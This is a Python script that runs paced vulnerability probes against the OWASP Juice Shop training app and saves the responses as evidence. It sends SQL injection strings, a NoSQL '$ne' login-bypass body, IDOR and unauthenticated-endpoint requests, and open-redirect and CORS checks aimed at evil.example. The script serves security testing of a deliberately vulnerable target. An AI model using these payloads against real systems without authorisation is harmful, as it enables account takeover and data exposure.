"""Paced vulnerability probing of Juice Shop (efficient, non-destructive)."""
from __future__ import annotations

import json
import os
import subprocess
import time

TARGET = "https://juice-shop.herokuapp.com"
BASE = "/home/nc/hunterx/HunterX/artifacts/final-rollout"
import glob
TS = sorted(glob.glob(f"{BASE}/*/"))[-1].split("/")[-2]
EVID = f"{BASE}/{TS}/evidence"


def req(method, path, data=None, headers=None, follow=False):
    url = f"{TARGET}{path}"
    cmd = ["curl", "-s", "-m", "30", "-w", "\\n__CODE__:%{http_code}", "-X", method]
    if follow:
        cmd.append("-L")
    cmd.append(url)
    if data:
        cmd += ["-H", "Content-Type: application/json", "-d", data]
    if headers:
        for h in headers:
            cmd += ["-H", h]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=40)
        out = p.stdout
        code = "000"
        if "__CODE__:" in out:
            code = out.rsplit("__CODE__:", 1)[1].strip()
            out = out.split("__CODE__:")[0]
        return {"code": code, "body": out[:2500]}
    except Exception as exc:  # noqa: BLE001
        return {"code": "ERR", "error": str(exc)}


def main():
    os.makedirs(EVID, exist_ok=True)
    results = {}

    # --- CORS check (reflected origin) ---
    r = req("GET", "/api/products", headers=["Origin: https://evil.example"])
    cors = ""
    if "__CODE__:" in str(r):
        pass
    # do CORS manually via curl -i
    p = subprocess.run(["curl", "-sI", "-m", "30", "-H", "Origin: https://evil.example", f"{TARGET}/api/products"],
                       capture_output=True, text=True, timeout=40)
    results["cors_reflected"] = {"headers": p.stdout[:1200], "code": "?"}
    time.sleep(2)

    # --- open redirect ---
    r = req("GET", "/redirect?to=https://evil.example", follow=True)
    results["open_redirect"] = r
    time.sleep(2)
    r = req("GET", "/redirect?to=//evil.example", follow=True)
    results["open_redirect2"] = r
    time.sleep(2)

    # --- SQLi on product search (reflected) ---
    r = req("GET", "/rest/products/search?q=%27")
    results["sqli_search_quote"] = r
    time.sleep(2)
    r = req("GET", "/rest/products/search?q=apple%27--")
    results["sqli_search_comment"] = r
    time.sleep(2)

    # --- NoSQL on login (injection) ---
    r = req("POST", "/rest/user/login", data='{"email":{"$ne":null},"password":{"$ne":null}}')
    results["nosql_login"] = r
    time.sleep(2)

    # --- IDOR on basket ---
    r = req("GET", "/rest/basket/999999")
    results["idor_basket"] = r
    time.sleep(2)

    # --- admin endpoint ---
    r = req("GET", "/rest/admin")
    results["admin_endpoint"] = r
    time.sleep(2)

    # --- users API ---
    r = req("GET", "/api/users")
    results["api_users"] = r
    time.sleep(2)

    # --- whoami without token ---
    r = req("GET", "/rest/user/whoami")
    results["whoami_noauth"] = r
    time.sleep(2)

    # --- ftp dir ---
    r = req("GET", "/ftp")
    results["ftp_dir"] = r
    time.sleep(2)

    # --- register a test account ---
    import uuid
    email = f"test-{uuid.uuid4().hex[:8]}@hunterx.local"
    r = req("POST", "/rest/user/register",
            data=json.dumps({"email": email, "password": "HunterX-test-123!", "passwordRepeat": "HunterX-test-123!",
                             "securityQuestion": {"id": 1, "question": "Mother's maiden name?"}, "securityAnswer": "test"}))
    results["register"] = {"email": email, **r}
    time.sleep(2)

    json.dump(results, open(f"{EVID}/vuln-probes.json", "w"), indent=2)
    for k, v in results.items():
        code = v.get("code", v.get("status", "?"))
        body = (v.get("body") or json.dumps(v.get("headers", "")))[:120].replace("\n", " ")
        print(f"  {k:22} -> {code}  {body}")


if __name__ == "__main__":
    main()
